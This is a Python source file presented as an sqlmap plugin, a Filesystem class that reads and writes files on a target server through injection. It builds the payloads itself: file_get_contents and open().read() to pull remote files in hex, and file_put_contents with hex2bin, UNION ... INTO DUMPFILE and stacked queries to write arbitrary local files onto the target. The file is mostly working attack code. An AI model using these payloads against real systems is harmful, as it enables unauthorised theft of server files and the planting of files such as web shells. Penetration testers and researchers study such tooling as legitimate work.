#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import getSQLSnippet
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapNoneDataException
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.union.use import unionUse
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def nonStackedReadFile(self, rFile):
        if not kb.bruteMode:
            infoMsg = "fetching file: '%s'" % rFile
            logger.info(infoMsg)

        result = inject.getValue("file_get_contents(\"%s\")" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "fetching file: '%s'" % remoteFile
            logger.info(infoMsg)

        length = inject.getValue("str(len(open(\"%s\").read().encode(\"hex\")))" % (remoteFile), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        if not isNumPosStrValue(length):
            warnMsg = "unable to retrieve the content of the "
            warnMsg += "file '%s'" % remoteFile

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                if not kb.bruteMode:
                    warnMsg += ", going to fall-back to simpler UNION technique"
                    logger.warn(warnMsg)
                result = self.nonStackedReadFile(remoteFile)
            else:
                raise SqlmapNoneDataException(warnMsg)
        else:
            length = int(length)
            chunkSize = 1

            if length > chunkSize:
                result = []

                for i in xrange(0, length, chunkSize):
                    chunk = inject.getValue("open(\"%s\").read().encode(\"hex\")[%s]" % (remoteFile, i), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                    result.append(chunk)
            else:
                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    @stackedmethod
    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "as the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warn(warnMsg)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        pushValue(kb.forceWhere)
        kb.forceWhere = PAYLOAD.WHERE.NEGATIVE
        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, remoteFile)
        unionUse(sqlQuery, unpack=False)
        kb.forceWhere = popValue()

        warnMsg = "expect junk characters inside the "
        warnMsg += "file as a leftover from UNION query"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def linesTerminatedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warn(warnMsg)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)
        
        payload = inject.getValue("substr(file_put_contents(\"%s\", hex2bin(\"%s\")),0,1)" % (remoteFile, fcEncodedStr), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
        warnMsg = "expect junk characters inside the "
        warnMsg += "file as a leftover from original query"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        debugMsg = "creating a support table to write the hexadecimal "
        debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("encoding file to its hexadecimal string value")
        fcEncodedList = self.fileEncode(localFile, "hex", False)

        debugMsg = "forging SQL statements to write the hexadecimal "
        debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("inserting the hexadecimal encoded file to the support table")

        inject.goStacked("SET GLOBAL max_allowed_packet = %d" % (1024 * 1024))  # 1MB (Note: https://github.com/sqlmapproject/sqlmap/issues/3230)

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, remoteFile), silent=True)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
